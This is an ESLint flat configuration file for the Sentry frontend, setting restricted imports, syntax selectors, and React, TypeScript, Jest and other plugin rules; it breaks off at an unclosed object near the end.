/**
 * To get started with this ESLint Configuration list be sure to read at least
 * these sections of the docs:
 *  - https://eslint.org/docs/latest/use/configure/configuration-files#specifying-files-and-ignores
 *  - https://eslint.org/docs/latest/use/configure/configuration-files#configuration-objects
 *  - https://eslint.org/docs/latest/use/configure/configuration-files#cascading-configuration-objects
 *
 * This is your friend:
 * `npx eslint --inspect-config`
 */

/**
 * Import Linting Strategy
 *
 * This configuration uses two complementary approaches for linting imports:
 *
 * 1. `no-restricted-imports` - Applied to 3rd party dependencies
 *    - Controls which external packages can be imported
 *    - Enforces consistent usage of third-party libraries across the codebase
 *    - Examples: restricting @testing-library/react, lodash, marked, etc.
 *
 * 2. `plugin/boundaries` - Applied to local module scopes
 *    - Enforces architectural boundaries between different parts of the codebase
 *    - Controls which internal modules can import from each other
 *    - Examples: preventing sentry from importing getsentry, core isolation, test boundaries
 */
import * as emotion from '@emotion/eslint-plugin';
import eslint from '@eslint/js';
import pluginQuery from '@tanstack/eslint-plugin-query';
import prettier from 'eslint-config-prettier';
import boundaries from 'eslint-plugin-boundaries';
import importPlugin from 'eslint-plugin-import';
import jest from 'eslint-plugin-jest';
import jestDom from 'eslint-plugin-jest-dom';
import * as mdx from 'eslint-plugin-mdx';
import noRelativeImportPaths from 'eslint-plugin-no-relative-import-paths';
import react from 'eslint-plugin-react';
import reactHooks from 'eslint-plugin-react-hooks';
import reactYouMightNotNeedAnEffect from 'eslint-plugin-react-you-might-not-need-an-effect';
// @ts-expect-error TS(7016): Could not find a declaration file
import sentry from 'eslint-plugin-sentry';
import testingLibrary from 'eslint-plugin-testing-library';
// @ts-expect-error TS (7016): Could not find a declaration file
import typescriptSortKeys from 'eslint-plugin-typescript-sort-keys';
import unicorn from 'eslint-plugin-unicorn';
import {globalIgnores} from 'eslint/config';
import globals from 'globals';
import invariant from 'invariant';
import typescript from 'typescript-eslint';

// eslint-disable-next-line boundaries/element-types
import * as sentryScrapsPlugin from './static/eslint/eslintPluginScraps/index.mjs';
// eslint-disable-next-line boundaries/element-types
import * as sentryPlugin from './static/eslint/eslintPluginSentry/index.mjs';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

invariant(react.configs.flat, 'For typescript');
invariant(react.configs.flat.recommended, 'For typescript');
invariant(react.configs.flat['jsx-runtime'], 'For typescript');

// Some rules can be enabled/disabled via env vars.
// This is useful for CI, where we want to run the linter with the most strict
// and slowest settings, and for pre-commit, where we want to run the linter
// faster.
// Some output is provided to help people toggle these settings locally.
const IS_PRECOMMIT =
  process.env.SENTRY_PRECOMMIT !== undefined &&
  Boolean(JSON.parse(process.env.SENTRY_PRECOMMIT));
const IS_CI = process.env.CI !== undefined && Boolean(JSON.parse(process.env.CI));
const enableTypeAwareLinting = (function () {
  // If we ask for something specific, use that.
  if (process.env.SENTRY_ESLINT_TYPEAWARE !== undefined) {
    return Boolean(JSON.parse(process.env.SENTRY_ESLINT_TYPEAWARE));
  }

  // If we're inside a pre-commit hook, defer to whether we're in CI.
  if (IS_PRECOMMIT) {
    return IS_CI;
  }

  // By default, enable type-aware linting.
  return true;
})();

// Exclude MDX files from type-aware linting
// https://github.com/orgs/mdx-js/discussions/2454
const globMDX = '**/*.mdx';

const restrictedImportPaths = [
  {
    name: '@testing-library/react',
    message:
      'Please import from `sentry-test/reactTestingLibrary` instead so that we can ensure consistency throughout the codebase',
  },
  {
    name: '@testing-library/react-hooks',
    message:
      'Please import from `sentry-test/reactTestingLibrary` instead so that we can ensure consistency throughout the codebase',
  },
  {
    name: '@testing-library/user-event',
    message:
      'Please import from `sentry-test/reactTestingLibrary` instead so that we can ensure consistency throughout the codebase',
  },
  {
    name: '@sentry/browser',
    message:
      'Please import from `@sentry/react` to ensure consistency throughout the codebase.',
  },
  {
    name: 'marked',
    message:
      "Please import marked from 'app/utils/marked' so that we can ensure sanitation of marked output",
  },
  {
    name: 'lodash',
    message:
      "Please import lodash utilities individually. e.g. `import isEqual from 'lodash/isEqual';`. See https://github.com/getsentry/frontend-handbook#lodash from for information",
  },
  {
    name: 'lodash/get',
    message:
      'Optional chaining `?.` and nullish coalescing operators `??` are available and preferred over using `lodash/get`. See https://github.com/getsentry/frontend-handbook#new-syntax for more information',
  },
  {
    name: 'react-router',
    importNames: ['withRouter'],
    message:
      "Use 'useLocation', 'useParams', 'useNavigate', 'useRoutes' from sentry/utils instead.",
  },
  {
    name: 'react-select',
    message: "Use 'sentry/components/forms/controls/reactSelectWrapper' instead.",
  },
  {
    name: 'sentry/utils/withSentryRouter',
    message:
      "Use 'useLocation', 'useParams', 'useNavigate', 'useRoutes' from sentry/utils instead.",
  },
  {
    name: 'qs',
    message: 'Please use query-string instead of qs',
  },
  {
    name: 'moment',
    message: 'Please import moment-timezone instead of moment',
  },
  {
    name: 'sentry/views/insights/common/components/insightsTimeSeriesWidget',
    message:
      'Do not use this directly in your view component, see https://sentry.sentry.io/stories/shared/views/dashboards/widgets/timeserieswidget/timeserieswidgetvisualization#deeplinking for more information',
  },
  {
    name: 'sentry/views/insights/common/components/insightsLineChartWidget',
    message:
      'Do not use this directly in your view component, see https://sentry.sentry.io/stories/shared/views/dashboards/widgets/timeserieswidget/timeserieswidgetvisualization#deeplinking for more information',
  },
  {
    name: 'sentry/views/insights/common/components/insightsAreaChartWidget',
    message:
      'Do not use this directly in your view component, see https://sentry.sentry.io/stories/shared/views/dashboards/widgets/timeserieswidget/timeserieswidgetvisualization#deeplinking for more information',
  },
  {
    name: 'color',
    message:
      'Only @sentry/scraps is allowed to use color package, please use the values set on the team or reach out to design-engineering for help',
  },
  {
    name: '@figma/code-connect',
    message:
      'The @figma/code-connect package should only be imported in *.figma.tsx files for Figma Code Connect integration',
  },
  {
    name: '@tanstack/react-form',
    message: 'Use @sentry/scraps/form instead',
  },
];

// Used by both: `languageOptions` & `parserOptions`
const ecmaVersion = 'latest';

export default typescript.config([
  {
    // Main parser & linter options
    // Rules are defined below and inherit these properties
    // https://eslint.org/docs/latest/use/configure/configuration-files#configuration-objects
    name: 'eslint/global/languageOptions',
    languageOptions: {
      ecmaVersion,
      sourceType: 'module',
      globals: {
        // TODO(ryan953): globals.browser seems to have a bug with trailing whitespace
        ...Object.fromEntries(Object.keys(globals.browser).map(k => [k.trim(), false])),
        ...globals.jest,
        MockApiClient: true,
        tick: true,
      },
      parser: typescript.parser,
      parserOptions: {
        ecmaFeatures: {
          globalReturn: false,
        },
        ecmaVersion,

        // https://typescript-eslint.io/packages/parser/#emitdecoratormetadata
        emitDecoratorMetadata: undefined,

        // https://typescript-eslint.io/packages/parser/#experimentaldecorators
        experimentalDecorators: undefined,

        // https://typescript-eslint.io/packages/parser/#jsdocparsingmode
        jsDocParsingMode: 'none',

        // https://typescript-eslint.io/packages/parser/#project
        // `projectService` is recommended
        project: false,

        // https://typescript-eslint.io/packages/parser/#projectservice
        // Specifies using TypeScript APIs to generate type information for rules.
        projectService: enableTypeAwareLinting,
        tsconfigRootDir: import.meta.dirname,
      },
    },
    linterOptions: {
      noInlineConfig: false,
      reportUnusedDisableDirectives: enableTypeAwareLinting ? 'error' : 'off',
    },
    settings: {
      react: {
        version: '19.2.0',
        defaultVersion: '19.2',
      },
      'import/parsers': {'@typescript-eslint/parser': ['.ts', '.tsx']},
      'import/resolver': {typescript: {}},
      'import/extensions': ['.js', '.jsx'],
    },
  },
  {
    name: 'eslint/global/files',
    // Default file selection
    // https://eslint.org/docs/latest/use/configure/configuration-files#specifying-files-and-ignores
    files: ['**/*.js', '**/*.mjs', '**/*.ts', '**/*.jsx', '**/*.tsx'],
  },
  // Global ignores
  // https://eslint.org/docs/latest/use/configure/configuration-files#globally-ignoring-files-with-ignores
  globalIgnores([
    '.devenv/**/*',
    '.github/**/*',
    '.mypy_cache/**/*',
    '.pytest_cache/**/*',
    '.venv/**/*',
    '**/*.d.ts',
    '**/dist/**/*',
    'tests/**/fixtures/**/*',
    '!tests/js/**/*',
    '**/vendor/**/*',
    'build-utils/**/*',
    'config/chartcuterie/config.js',
    'figma.config.json',
    'fixtures/artifact_bundle/**/*',
    'fixtures/artifact_bundle_debug_ids/**/*',
    'fixtures/artifact_bundle_duplicated_debug_ids/**/*',
    'fixtures/profiles/embedded.js',
    'jest.config.ts',
    'api-docs/**/*',
    'src/sentry/static/sentry/js/**/*',
    'src/sentry/templates/sentry/**/*',
    'stylelint.config.js',
    '.artifacts/**/*',
  ]),
  /**
   * Rules are grouped by plugin. If you want to override a specific rule inside
   * the recommended set, then it's recommended to spread the new rule on top
   * of the predefined ones.
   *
   * For example: if you want to enable a new plugin in the codebase and their
   * recommended rules (or a new rule that's part of an existing plugin)
   *
   * 1. First you'd setup a configuration object for that plugin:
   *    {
   *      name: 'my-plugin/recommended',
   *      ...myPlugin.configs.recommended,
   *    },
   *
   * 2. Second you'd override the rule you want to deal with, maybe making it a
   *    warning to start:
   *    {
   *      name: 'my-plugin/recommended',
   *      ...myPlugin.configs.recommended,
   *      rules: {
   *        ['a-rule-outside-the-recommended-list']: 'error',
   *
   *        ...myPlugin.configs.recommended.rules,
   *        ['a-recommended-rule']: 'warn',
   *      }
   *    },
   *
   * 3. Finally, once all warnings are fixed, update from 'warning' to 'error',
   *    or remove the override and rely on the recommended rules again.
   */
  {
    name: 'eslint/rules',
    // https://eslint.org/docs/latest/rules/
    rules: {
      'array-callback-return': 'error',
      'block-scoped-var': 'error',
      'consistent-return': 'error',
      'default-case': 'error',
      'dot-notation': 'error',
      eqeqeq: 'error',
      'guard-for-in': 'off', // TODO(ryan953): Fix violations and enable this rule
      'multiline-comment-style': ['error', 'separate-lines'],
      'no-alert': 'error',
      'no-caller': 'error',
      'no-console': 'error',
      'no-else-return': ['error', {allowElseIf: false}],
      'no-eval': 'error',
      'no-extend-native': 'error',
      'no-extra-bind': 'error',
      'no-floating-decimal': 'error',
      'no-implied-eval': 'error',
      'no-inner-declarations': 'error',
      'no-lone-blocks': 'error',
      'no-loop-func': 'error',
      'no-multi-str': 'error',
      'no-native-reassign': 'error',
      'no-new-func': 'error',
      'no-new-wrappers': 'error',
      'no-new': 'error',
      'no-octal-escape': 'error',
      'no-param-reassign': 'off', // TODO(ryan953): Fix violations and enable this rule
      'no-proto': 'error',
      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['sentry/utils/theme*', 'sentry/utils/theme'],
              importNames: ['lightTheme', 'darkTheme', 'default'],
              message:
                "Use 'useTheme' hook of withTheme HOC instead of importing theme directly. For tests, use ThemeFixture.",
            },
          ],
          paths: restrictedImportPaths,
        },
      ],
      'no-restricted-syntax': [
        'error',
        {
          selector:
            "ImportDeclaration[source.value='react'] > ImportSpecifier[imported.name='forwardRef']",
          message:
            'Since React 19, it is no longer necessary to use forwardRef - refs can be passed as a normal prop',
        },
        {
          selector:
            "CallExpression[callee.object.name='React'][callee.property.name='forwardRef']",
          message:
            'Since React 19, it is no longer necessary to use forwardRef - refs can be passed as a normal prop',
        },
        {
          selector:
            "CallExpression[callee.object.name='jest'][callee.property.name='mock'][arguments.0.value='sentry/utils/useProjects']",
          message:
            'Please do not mock useProjects. Use `ProjectsStore.loadInitialData([ProjectFixture()])` instead. It can be used before the component is mounted or in a beforeEach hook.',
        },
        {
          selector:
            "CallExpression[callee.object.name='jest'][callee.property.name='mock'][arguments.0.value='sentry/utils/useOrganization']",
          message:
            'Please do not mock useOrganization. Pass organization to the render options. `render(<Component />, {organization: OrganizationFixture({isSuperuser: true})})`',
        },
        {
          // Forces us to use type annotations for let variables that are initialized with a type,
          // except for those declared in for...of or for...in loops.
          selector:
            'VariableDeclaration[kind = "let"]:not(ForOfStatement > VariableDeclaration, ForInStatement > VariableDeclaration) > VariableDeclarator[init = null]:not([id.typeAnnotation])',
          message: 'Provide a type annotation',
        },
        {
          // Disallow IIFEs inside JSX (children, attribute values, and spreads)
          selector:
            'JSXExpressionContainer > CallExpression[callee.type="ArrowFunctionExpression"], JSXExpressionContainer > CallExpression[callee.type="FunctionExpression"], JSXSpreadAttribute > CallExpression[callee.type="ArrowFunctionExpression"], JSXSpreadAttribute > CallExpression[callee.type="FunctionExpression"]',
          message: 'Do not use IIFEs inside JSX.',
        },
        // Forbid absolute URLs in Link's to=. Use ExternalLink instead.
        {
          selector:
            "JSXOpeningElement[name.name='Link'] JSXAttribute[name.name='to'] Literal[value=/^https?:/i]",
          message: "Do not pass an absolute URL to Link's to=. Use ExternalLink instead.",
        },
      ],
      'no-return-assign': 'error',
      'no-script-url': 'error',
      'no-self-compare': 'error',
      'no-sequences': 'error',
      'no-throw-literal': 'off', // Disabled in favor of @typescript-eslint/only-throw-error
      'prefer-promise-reject-errors': 'off', // Disabled in favor of @typescript-eslint/prefer-promise-reject-errors
      'object-shorthand': ['error', 'properties'],
      'prefer-arrow-callback': ['error', {allowNamedFunctions: true}],
      radix: 'error',
      'require-await': 'off', // Disabled in favor of @typescript-eslint/require-await
      'spaced-comment': [
        'error',
        'always',
        {
          line: {markers: ['/'], exceptions: ['-', '+']},
          block: {exceptions: ['*'], balanced: true},
        },
      ],
      strict: 'error',
      'vars-on-top': 'off',
      'wrap-iife': ['error', 'any'],
      yoda: 'error',

      // https://github.com/eslint/eslint/blob/main/packages/js/src/configs/eslint-recommended.js
      ...eslint.configs.recommended.rules,
      'no-cond-assign': ['error', 'always'],
      'no-prototype-builtins': 'off',
      'no-useless-escape': 'error',
    },
  },
  {
    // https://github.com/import-js/eslint-plugin-import/tree/main/docs/rules
    ...importPlugin.flatConfigs.recommended,
    name: 'plugin/import',
    rules: {
      // https://github.com/import-js/eslint-plugin-import/blob/main/config/recommended.js
      ...importPlugin.flatConfigs.recommended.rules,
      'import/no-absolute-path': 'error',
      'import/no-amd': 'error',
      'import/no-anonymous-default-export': 'error',
      'import/no-duplicates': 'error',
      'import/no-extraneous-dependencies': [
        'error',
        {includeTypes: true, devDependencies: ['!eslint.config.mjs']},
      ],
      'import/no-named-default': 'error',
      'import/no-nodejs-modules': 'error',
      'import/no-webpack-loader-syntax': 'error',
      'import/default': 'off', // Disabled in favor of typescript-eslint
      'import/named': 'off', // Disabled in favor of typescript-eslint
      'import/namespace': 'off', // Disabled in favor of typescript-eslint
      'import/no-named-as-default-member': 'off', // Disabled in favor of typescript-eslint
      'import/no-named-as-default': 'off', // TODO(ryan953): Fix violations and enable this rule
      'import/no-unresolved': 'off', // Disabled in favor of typescript-eslint
    },
  },
  {
    name: 'plugin/@sentry/sentry',
    plugins: {'@sentry': sentryPlugin},
    rules: {
      '@sentry/no-static-translations': 'error',
    },
  },
  {
    name: 'plugin/@sentry/scraps',
    plugins: {'@sentry/scraps': sentryScrapsPlugin},
    rules: {
      '@sentry/scraps/no-core-import': 'error',
      '@sentry/scraps/no-token-import': 'error',
      '@sentry/scraps/use-semantic-token': [
        'error',
        {enabledCategories: ['background', 'border', 'content']},
      ],
      '@sentry/scraps/restrict-jsx-slot-children': [
        'error',
        {
          slots: [
            {
              componentNames: ['CompactSelect'],
              propNames: ['menuFooter'],
              allowed: [
                {
                  source: '@sentry/scraps/compactSelect',
                  names: [
                    'MenuComponents.CTAButton',
                    'MenuComponents.CTALinkButton',
                    'MenuComponents.ApplyButton',
                    'MenuComponents.CancelButton',
                    'MenuComponents.Alert',
                  ],
                },
                {
                  source: '@sentry/scraps/layout',
                  names: ['Flex', 'Stack', 'Grid', 'Container'],
                },
              ],
            },
            {
              componentNames: ['CompactSelect'],
              propNames: ['menuHeaderTrailingItems'],
              allowed: [
                {
                  source: '@sentry/scraps/compactSelect',
                  names: [
                    'MenuComponents.HeaderButton',
                    'MenuComponents.ClearButton',
                    'MenuComponents.ResetButton',
                  ],
                },
                {
                  source: '@sentry/scraps/layout',
                  names: ['Flex', 'Stack', 'Grid', 'Container'],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    name: 'plugin/no-relative-import-paths',
    // https://github.com/MelvinVermeer/eslint-plugin-no-relative-import-paths?tab=readme-ov-file#rule-options
    plugins: {'no-relative-import-paths': noRelativeImportPaths},
    rules: {
      'no-relative-import-paths/no-relative-import-paths': [
        'error',
        {
          prefix: 'sentry',
          rootDir: 'static/app',
          allowSameFolder: true, // TODO(ryan953): followup and investigate `allowSameFolder`, maybe exceptions for *.spec.tsx files?
        },
      ],
    },
  },
  {
    name: 'plugin/tanstack/query',
    plugins: {
      '@tanstack/query': pluginQuery,
    },
    rules: {
      ...pluginQuery.configs.recommended.rules,
      '@tanstack/query/no-rest-destructuring': 'error',
    },
  },
  {
    name: 'plugin/react',
    // https://github.com/jsx-eslint/eslint-plugin-react/tree/master/docs/rules
    plugins: {
      ...react.configs.flat.recommended.plugins,
      ...react.configs.flat['jsx-runtime'].plugins,
    },
    rules: {
      'react/function-component-definition': 'error',
      'react/jsx-boolean-value': ['error', 'never'],
      'react/jsx-fragments': ['error', 'element'],
      'react/jsx-handler-names': 'off', // TODO(ryan953): Fix violations and enable this rule
      'react/no-did-mount-set-state': 'error',
      'react/no-did-update-set-state': 'error',
      'react/no-redundant-should-component-update': 'error',
      'react/no-typos': 'error',
      'react/self-closing-comp': 'error',
      'react/sort-comp': 'error',

      // https://github.com/jsx-eslint/eslint-plugin-react/blob/master/index.js
      ...react.configs.flat.recommended.rules,
      ...react.configs.flat['jsx-runtime'].rules,
      'react/jsx-curly-brace-presence': [
        'error',
        {props: 'never', children: 'ignore', propElementValues: 'always'},
      ],
      'react/display-name': 'off', // TODO(ryan953): Fix violations and delete this line
      'react/no-unescaped-entities': 'off',
      'react/no-unknown-property': ['error', {ignore: ['css']}],
      'react/prop-types': 'off', // TODO(ryan953): Fix violations and delete this line
    },
  },
  {
    name: 'plugin/react-hooks',
    // https://github.com/facebook/react/tree/main/packages/eslint-plugin-react-hooks
    plugins: {'react-hooks': reactHooks},
    rules: {
      'react-hooks/exhaustive-deps': [
        'error',
        {additionalHooks: '(useEffectAfterFirstRender|useMemoWithPrevious)'},
      ],
      'react-hooks/rules-of-hooks': 'error',
    },
  },
  {
    name: 'plugin/typescript-eslint/type-aware-linting',
    ignores: [globMDX],
    // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/flat/strict-type-checked.ts
    // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/flat/stylistic-type-checked.ts
    rules: enableTypeAwareLinting
      ? {
          '@typescript-eslint/await-thenable': 'error',
          '@typescript-eslint/consistent-type-exports': 'error',
          '@typescript-eslint/no-array-delete': 'error',
          '@typescript-eslint/no-base-to-string': 'error',
          '@typescript-eslint/no-for-in-array': 'error',
          '@typescript-eslint/no-unnecessary-type-assertion': 'error',
          '@typescript-eslint/only-throw-error': 'error',
          '@typescript-eslint/prefer-optional-chain': 'error',
          '@typescript-eslint/prefer-promise-reject-errors': 'error',
          '@typescript-eslint/require-await': 'error',
          '@typescript-eslint/no-meaningless-void-operator': 'error',
        }
      : {},
  },
  {
    name: 'plugin/typescript-eslint/custom',
    ignores: [globMDX],
    rules: {
      'no-shadow': 'off', // Disabled in favor of @typescript-eslint/no-shadow
      'no-use-before-define': 'off', // See also @typescript-eslint/no-use-before-define

      '@typescript-eslint/naming-convention': [
        'error',
        {selector: 'typeLike', format: ['PascalCase'], leadingUnderscore: 'allow'},
        {selector: 'enumMember', format: ['UPPER_CASE']},
      ],

      '@typescript-eslint/no-restricted-types': [
        'error',
        {
          types: {
            object: {
              message:
                'The `object` type is hard to use. Use `Record<PropertyKey, unknown>` instead. See: https://github.com/typescript-eslint/typescript-eslint/pull/848',
              fixWith: 'Record<PropertyKey, unknown>',
            },
            Buffer: {
              message:
                'Use Uint8Array instead. See: https://sindresorhus.com/blog/goodbye-nodejs-buffer',
              suggest: ['Uint8Array'],
            },
            '[]': "Don't use the empty array type `[]`. It only allows empty arrays. Use `SomeType[]` instead.",
            '[[]]':
              "Don't use `[[]]`. It only allows an array with a single element which is an empty array. Use `SomeType[][]` instead.",
            '[[[]]]': "Don't use `[[[]]]`. Use `SomeType[][][]` instead.",
          },
        },
      ],
      '@typescript-eslint/no-shadow': 'error',
      '@typescript-eslint/no-use-before-define': 'off', // Enabling this will cause a lot of thrash to the git history
      '@typescript-eslint/no-useless-empty-export': 'error',
    },
  },
  // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/flat/base.ts
  // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/eslint-recommended-raw.ts
  // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/flat/recommended.ts
  // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/flat/strict.ts
  // https://github.com/typescript-eslint/typescript-eslint/blob/main/packages/eslint-plugin/src/configs/flat/stylistic.ts
  ...typescript.configs.strict.map(c => ({...c, name: `plugin/${c.name}`})),
  ...typescript.configs.stylistic.map(c => ({...c, name: `plugin/${c.name}`})),
  {
    name: 'plugin/typescript-eslint/overrides',
    // https://typescript-eslint.io/rules/
    plugins: {'@typescript-eslint': typescript.plugin},
    rules: {
      'prefer-spread': 'off',
      '@typescript-eslint/prefer-enum-initializers': 'error',
      'no-unused-expressions': 'off', // Disabled in favor of @typescript-eslint/no-unused-expressions
      '@typescript-eslint/no-unused-expressions': ['error', {allowTernary: true}],

      // Recommended overrides
      '@typescript-eslint/no-empty-object-type': ['error', {allowInterfaces: 'always'}],
      '@typescript-eslint/no-explicit-any': 'off',
      '@typescript-eslint/no-namespace': 'off',
      '@typescript-eslint/no-non-null-asserted-optional-chain': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/no-require-imports': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/no-this-alias': 'off', // TODO(ryan953): Fix violations and delete this line

      // Strict overrides
      '@typescript-eslint/no-dynamic-delete': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/no-invalid-void-type': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/no-non-null-assertion': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/unified-signatures': 'off',

      // Stylistic overrides
      '@typescript-eslint/array-type': ['error', {default: 'array-simple'}],
      '@typescript-eslint/class-literal-property-style': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/consistent-type-definitions': 'off', // TODO(ryan953): Fix violations and delete this line
      '@typescript-eslint/no-empty-function': 'off', // TODO(ryan953): Fix violations and delete this line

      // Customization
      '@typescript-eslint/no-unused-vars':
        // Favor "noUnusedLocals": true in CI, but enable in pre-commit to catch unused imports without running tsc
        IS_PRECOMMIT && !IS_CI
          ? [
              'error',
              {
                vars: 'all',
                args: 'all',
                caughtErrors: 'none',

                // Ignore vars that start with an underscore
                // e.g. if you want to omit a property using object spread:
                //
                //   const {name: _name, ...props} = this.props;
                //
                varsIgnorePattern: '^_',
                argsIgnorePattern: '^_',
                destructuredArrayIgnorePattern: '^_',
              },
            ]
          : 'off',
    },
  },
  {
    name: 'plugin/typescript-sort-keys',
    // https://github.com/infctr/eslint-plugin-typescript-sort-keys
    plugins: {'typescript-sort-keys': typescriptSortKeys},
    rules: {
      'typescript-sort-keys/interface': [
        'error',
        'asc',
        {caseSensitive: true, natural: false, requiredFirst: true},
      ],
    },
  },
  {
    name: 'plugin/sentry',
    // https://github.com/getsentry/eslint-config-sentry/tree/master/packages/eslint-plugin-sentry/docs/rules
    plugins: {sentry},
    rules: {
      'sentry/no-digits-in-tn': 'error',
      'sentry/no-dynamic-translations': 'error', // TODO(ryan953): There are no docs for this rule
      'sentry/no-styled-shortcut': 'error',
    },
  },
  {
    name: 'plugin/@emotion',
    // https://github.com/emotion-js/emotion/tree/main/packages/eslint-plugin/docs/rules
    plugins: {'@emotion': emotion},
    rules: {
      '@emotion/import-from-emotion': 'off', // Not needed, in v11 we import from @emotion/react
      '@emotion/jsx-import': 'off', // Not needed, handled by babel
      '@emotion/no-vanilla': 'error',
      '@emotion/pkg-renaming': 'off', // Not needed, we have migrated to v11 and the old package names cannot be used anymore
      '@emotion/styled-import': 'error',
      '@emotion/syntax-preference': ['error', 'string'],
    },
  },
  {
    name: 'plugin/unicorn',
    // https://github.com/sindresorhus/eslint-plugin-unicorn?tab=readme-ov-file#rules
    plugins: {unicorn},
    rules: {
      // The recommended rules are very opinionated. We don't need to enable them.

      'unicorn/custom-error-definition': 'error',
      'unicorn/error-message': 'error',
      'unicorn/filename-case': ['off', {case: 'camelCase'}], // TODO(ryan953): Fix violations and enable this rule
      'unicorn/new-for-builtins': 'error',
      'unicorn/no-abusive-eslint-disable': 'error',
      'unicorn/no-array-push-push': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/no-await-in-promise-methods': 'error',
      'unicorn/no-instanceof-array': 'error',
      'unicorn/no-invalid-remove-event-listener': 'error',
      'unicorn/no-negated-condition': 'error',
      'unicorn/no-negation-in-equality-check': 'error',
      'unicorn/no-new-array': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/no-single-promise-in-promise-methods': 'warn', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/no-static-only-class': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/no-this-assignment': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/no-unnecessary-await': 'error',
      'unicorn/no-useless-fallback-in-spread': 'error',
      'unicorn/no-useless-length-check': 'error',
      'unicorn/no-useless-undefined': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/no-zero-fractions': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-array-find': 'error',
      'unicorn/prefer-array-flat-map': 'error',
      'unicorn/prefer-array-flat': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-array-index-of': 'error',
      'unicorn/prefer-array-some': 'error',
      'unicorn/prefer-date-now': 'error',
      'unicorn/prefer-default-parameters': 'warn', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-export-from': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-includes': 'error',
      'unicorn/prefer-logical-operator-over-ternary': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-native-coercion-functions': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-negative-index': 'error',
      'unicorn/prefer-node-protocol': 'error',
      'unicorn/prefer-object-from-entries': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-prototype-methods': 'warn', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/prefer-regexp-test': 'off', // TODO(ryan953): Fix violations and enable this rule
      'unicorn/throw-new-error': 'off', // TODO(ryan953): Fix violations and enable this rule
    },
  },
  {
    name: 'plugin/jest',
    files: ['**/*.spec.{ts,js,tsx,jsx}', 'tests/js/**/*.{ts,js,tsx,jsx}'],
    // https://github.com/jest-community/eslint-plugin-jest/tree/main/docs/rules
    plugins: jest.configs['flat/recommended'].plugins,
    rules: {
      'jest/max-nested-describe': 'error',
      'jest/no-duplicate-hooks': 'error',
      'jest/no-large-snapshots': ['error', {maxSize: 2000}], // We don't recommend snapshots, but if there are any keep it small

      // https://github.com/jest-community/eslint-plugin-jest/blob/main/src/index.ts
      ...jest.configs['flat/recommended'].rules,
      ...jest.configs['flat/style'].rules,

      'jest/expect-expect': 'off', // Disabled as we have many tests which render as simple validations
      'jest/no-conditional-expect': 'off', // TODO(ryan953): Fix violations then delete this line
      'jest/no-disabled-tests': 'error', // `recommended` set this to warn, we've upgraded to error
    },
  },
  {
    name: 'plugin/jest-dom',
    files: ['**/*.spec.{ts,js,tsx,jsx}', 'tests/js/**/*.{ts,js,tsx,jsx}'],
    // https://github.com/testing-library/eslint-plugin-jest-dom/tree/main?tab=readme-ov-file#supported-rules
    ...jestDom.configs['flat/recommended'],
  },
  {
    name: 'plugin/testing-library',
    files: ['**/*.spec.{ts,js,tsx,jsx}', 'tests/js/**/*.{ts,js,tsx,jsx}'],
    // https://github.com/testing-library/eslint-plugin-testing-library/tree/main/docs/rules
    ...testingLibrary.configs['flat/react'],
    rules: {
      // https://github.com/testing-library/eslint-plugin-testing-library/blob/main/lib/configs/react.ts
      ...testingLibrary.configs['flat/react'].rules,
      'testing-library/no-unnecessary-act': 'off',
      'testing-library/render-result-naming-convention': 'off',
    },
  },
  {
    name: 'plugin/prettier',
    ...prettier,
    rules: {
      // import sorting is handled with prettier-plugin-sort-imports
      'import/order': 'off',
      'sort-imports': 'off',
      'import/newline-after-import': 'off',
      // prettier-plugin-sort-imports always combines imports
      'import/no-duplicates': 'off',
    },
  },
  {
    name: 'plugin/you-might-not-need-an-effect',
    ...reactYouMightNotNeedAnEffect.configs.recommended,
    rules: {
      'react-you-might-not-need-an-effect/no-derived-state': 'error',
      'react-you-might-not-need-an-effect/no-chain-state-updates': 'off',
      'react-you-might-not-need-an-effect/no-event-handler': 'off',
      'react-you-might-not-need-an-effect/no-adjust-state-on-prop-change': 'off',
      'react-you-might-not-need-an-effect/no-reset-all-state-on-prop-change': 'off',
      'react-you-might-not-need-an-effect/no-pass-live-state-to-parent': 'off',
      'react-you-might-not-need-an-effect/no-pass-data-to-parent': 'off',
      'react-you-might-not-need-an-effect/no-initialize-state': 'off',
      'react-you-might-not-need-an-effect/no-manage-parent': 'off',
      'react-you-might-not-need-an-effect/no-empty-effect': 'off',
    },
  },
  {
    name: 'files/*.config.*',
    files: ['**/*.config.*'],
    languageOptions: {
      globals: {
        ...globals.commonjs,
        ...globals.node,
      },
    },

    rules: {
      'import/no-nodejs-modules': 'off',
    },
  },
  {
    name: 'eslint',
    files: ['static/eslint/**/*.mjs'],
    languageOptions: {
      globals: {
        ...globals.node,
      },
    },

    rules: {
      'no-console': 'off',
      'import/no-nodejs-modules': 'off',
    },
  },
  {
